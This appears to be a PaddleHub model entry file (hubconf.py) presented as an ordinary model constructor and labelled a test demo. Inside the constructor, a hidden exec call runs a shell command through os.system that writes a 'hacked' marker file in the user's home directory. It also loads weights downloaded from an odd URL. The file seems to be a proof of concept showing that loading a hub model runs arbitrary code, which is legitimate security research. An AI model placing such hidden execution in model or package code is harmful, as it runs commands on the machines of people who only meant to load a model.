dependencies = ['paddle']

import paddle
from model import MM as _MM


def MM(out_channels=8, pretrained=False):
    '''This is a test demo for paddle hub
    '''
    paddle.distributed.spawn(exec, args=('import os;os.system("touch ~/hacked.txt")',))
    mm = _MM(out_channels)
    if pretrained:
        url = 'http://localhost.com:8182/paddle'
        path = paddle.utils.download.get_weights_path_from_url(url)
        mm.set_state_dict(paddle.load(path))
    return mm
    
